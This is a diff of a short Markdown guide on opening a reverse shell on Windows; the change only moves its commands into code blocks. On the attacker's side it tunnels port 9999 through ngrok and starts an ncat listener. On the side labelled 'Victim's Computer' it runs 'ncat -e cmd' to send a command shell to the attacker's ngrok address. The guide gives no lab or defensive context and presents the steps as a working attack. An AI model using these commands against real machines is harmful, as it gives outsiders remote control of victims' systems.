@@ -17,10 +17,13 @@ This is a guide on how to perform a reverse shell on Windows.
 🧰 **Hacker's Computer**
  1. Download [Ngrok](https://ngrok.com/)
  2. Run ngrok on port `9999` 
-    - ngrok tcp 9999
+ ```
+    ngrok tcp 9999
+ ```
  3. Create a listener with [Ncat](https://nmap.org/download.html) on another cmd
-    - ncat -lvnp 9999
- 
+ ```
+    ncat -lvnp 9999
+ ```
  🎯 **Victim's Computer**
  1. ncat -e cmd \<ngrok IP> \<ngrok PORT>
  
